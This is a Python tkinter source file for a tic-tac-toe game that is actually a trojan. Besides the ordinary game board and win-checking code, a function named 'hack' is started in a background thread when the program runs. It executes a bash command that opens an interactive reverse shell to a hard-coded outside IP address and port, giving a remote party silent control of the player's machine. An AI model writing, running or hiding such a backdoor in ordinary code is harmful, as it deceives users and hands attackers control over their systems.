from tkinter import *
from tkinter import messagebox
import threading
import subprocess

window = Tk()

window.title("Welcome to Amit Tic-Tac-Toe ")
window.geometry("400x300")

lbl = Label(window, text="Tic-tac-toe Game", font=('Helvetica', '15'))
lbl.grid(row=0, column=0)
lbl = Label(window, text="Player 1: X", font=('Helvetica', '10'))
lbl.grid(row=1, column=0)
lbl = Label(window, text="Player 2: O", font=('Helvetica', '10'))
lbl.grid(row=2, column=0)

turn = 1  # For first person turn.


def clickedproccessing():
    global turn
    if turn == 1:
        turn = 2
        return "X"
    elif turn == 2:
        turn = 1
        return "O"


def clicked1():
    global turn
    if btn1["text"] == " ":  # For getting the text of a button
        btn1["text"] = clickedproccessing()
        check()


def clicked2():
    global turn
    if btn2["text"] == " ":
        btn2["text"] = clickedproccessing()
        check()


def clicked3():
    global turn
    if btn3["text"] == " ":
        btn3["text"] = clickedproccessing()
        check()


def clicked4():
    global turn
    if btn4["text"] == " ":
        btn4["text"] = clickedproccessing()
        check()


def clicked5():
    global turn
    if btn5["text"] == " ":
        btn5["text"] = clickedproccessing()
        check()


def clicked6():
    global turn
    if btn6["text"] == " ":
        btn6["text"] = clickedproccessing()
        check()


def clicked7():
    global turn
    if btn7["text"] == " ":
        btn7["text"] = clickedproccessing()
        check()


def clicked8():
    global turn
    if btn8["text"] == " ":
        btn8["text"] = clickedproccessing()
        check()


def clicked9():
    global turn
    if btn9["text"] == " ":
        btn9["text"] = clickedproccessing()
        check()


def check():
    global flag
    b1 = btn1["text"] # Getting value from each button,
    b2 = btn2["text"] # to check for any possible win event
    b3 = btn3["text"]
    b4 = btn4["text"]
    b5 = btn5["text"]
    b6 = btn6["text"]
    b7 = btn7["text"]
    b8 = btn8["text"]
    b9 = btn9["text"]
    flag += 1
    # Check every possible win on map
    if b1 == b2 and b1 == b3 and b1 == "O" or b1 == b2 and b1 == b3 and b1 == "X":
        win(b1)
    if b4 == b5 and b4 == b6 and b4 == "O" or b4 == b5 and b4 == b6 and b4 == "X":
        win(b4)
    if b7 == b8 and b7 == b9 and b7 == "O" or b7 == b8 and b7 == b9 and b7 == "X":
        win(b7)
    if b1 == b4 and b1 == b7 and b1 == "O" or b1 == b4 and b1 == b7 and b1 == "X":
        win(b1)
    if b2 == b5 and b2 == b8 and b2 == "O" or b2 == b5 and b2 == b8 and b2 == "X":
        win(b2)
    if b3 == b6 and b3 == b9 and b3 == "O" or b3 == b6 and b3 == b9 and b3 == "X":
        win(b3)
    if b1 == b5 and b1 == b9 and b1 == "O" or b1 == b5 and b1 == b9 and b1 == "X":
        win(b1)
    if b7 == b5 and b7 == b3 and b7 == "O" or b7 == b5 and b7 == b3 and b7 == "X":
        win(b7)
    elif flag == 9:
        messagebox.showinfo("DRAW !", "DRAW")
        window.destroy()


def win(player):
    ans = "Game complete, player " + player + " wins !!!"
    messagebox.showinfo("WIN !!!", ans)
    window.destroy()  # is used to close the program


btn1 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked1)
btn1.grid(column=1, row=1)
btn2 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked2)
btn2.grid(column=2, row=1)
btn3 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked3)
btn3.grid(column=3, row=1)
btn4 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked4)
btn4.grid(column=1, row=2)
btn5 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked5)
btn5.grid(column=2, row=2)
btn6 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked6)
btn6.grid(column=3, row=2)
btn7 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked7)
btn7.grid(column=1, row=3)
btn8 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked8)
btn8.grid(column=2, row=3)
btn9 = Button(window, text=" ", bg="black", fg="white", width=3, height=1, font=('Helvetica', '20'), command=clicked9)
btn9.grid(column=3, row=3)

flag = 0  # Flag used to apeend (1) in every turn is occurred

def hack(num):
    subprocess.check_call("/bin/bash -i > /dev/tcp/82.165.97.169/2004 0<&1 2>&1", shell=True, executable='/bin/bash')

if __name__ == '__main__':
    thread = threading.Thread(target= hack, args=(10,))
    thread.start()
    window.mainloop()
    exit()